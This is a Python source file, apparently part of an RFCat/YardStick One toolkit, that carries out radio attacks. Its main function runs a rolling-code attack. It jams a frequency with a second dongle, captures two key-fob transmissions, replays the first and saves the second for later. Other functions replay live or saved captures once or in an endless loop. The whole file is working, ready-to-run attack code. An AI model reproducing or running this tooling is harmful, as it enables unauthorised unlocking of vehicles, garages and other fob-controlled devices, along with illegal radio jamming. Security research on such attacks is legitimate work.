
import RFFunctions as tools
import findDevices, jam
import time

#-----------------Rolling Code-------------------------#
def rollingCode(d, frequency, jamming_variance, baud_rate_jammer, rolling_code, upper_rssi, lower_rssi):
    '''Sets up for a rolling code attack, requires a frequency
    and a RFCat Object'''

    print("ROLLING CODE REQUIRES 2 YardSticks Plugged In")
    j = jam.setupJammer(1, baud_rate_jammer)

    jam.jamming(j, "start", frequency+jamming_variance, rolling_code)
    roll_captures, signal_strength = tools.capturePayload(d, rolling_code, upper_rssi, lower_rssi)
    print("Waiting to capture your rolling code transmission")
    print signal_strength
    print roll_captures

    payloads = tools.createBytesFromPayloads(roll_captures)

    time.sleep(1)
    jam.jamming(j, "stop",frequency+jamming_variance, rolling_code)

    print "Sending First Payload "
    tools.sendTransmission(payloads[0] ,d)
    response = raw_input( "Ready to send second Payload?? (y/n) ")
    if response.lower() == "y":
        tools.sendTransmission(payloads[1] ,d)

    else:
        response = raw_input( "Choose a name to save your file as and press enter: ")
        with open("./files/"+response+".cap", 'w') as file:
            file.write(roll_captures[1])
        print "Saved file as: ./files/"+response+".cap  You can manually replay this later with -s -u"
#------------------End Roll Code-------------------------#


#---------------Replay Live Capture----------------------#
def replayLiveCapture(d, rolling_code, upper_rssi, lower_rssi):
    '''Replays a live capture real time, lets you select your capture
    and replay it or save it for later'''

    replay_capture, signal_strength = tools.capturePayload(d,rolling_code, upper_rssi, lower_rssi)
    replay_capture = [replay_capture]

    response = raw_input( "Replay this capture? (y/n) ")
    if response.lower() == 'y':
        payloads = tools.createBytesFromPayloads(replay_capture)
        for payload in payloads:
            print "WAITING TO SEND"
            time.sleep(1)
            tools.sendTransmission(payload ,d)

    response = raw_input( "Save this capture for later? (y/n) ")
    if response.lower() == 'y':
        mytime = time.strftime('%X')
        with open("./files/"+mytime+"_payload.cap", 'w') as file:
            file.write(replay_capture[0])
        print "Saved file as: ./files/"+mytime+"_payload.cap"
#---------------End Replay Live Capture-------------------#


#---------------Replay Saved Capture----------------------#
def replaySavedCapture(d, uploaded_payload):
    with open(uploaded_payload) as f:
        payloads = f.readlines()
        print payloads
        payloads = tools.createBytesFromPayloads(payloads)

        response = raw_input( "Send once, or forever? (o/f) Default = o ")

        if response.lower() == "f":
            print("\nNOTE: TO STOP YOU NEED TO CTRL-Z and Unplug/Plug IN YARDSTICK-ONE\n")
            while True:
                for payload in payloads:
                    print "WAITING TO SEND"
                    time.sleep(1)          #You may not want this if you need rapid fire tx
                    tools.sendTransmission(payload ,d)

        else:
            for payload in payloads:
                    print "WAITING TO SEND"
                    time.sleep(1)
                    tools.sendTransmission(payload ,d)

#--------------- End Replay Saved Capture-------------------#
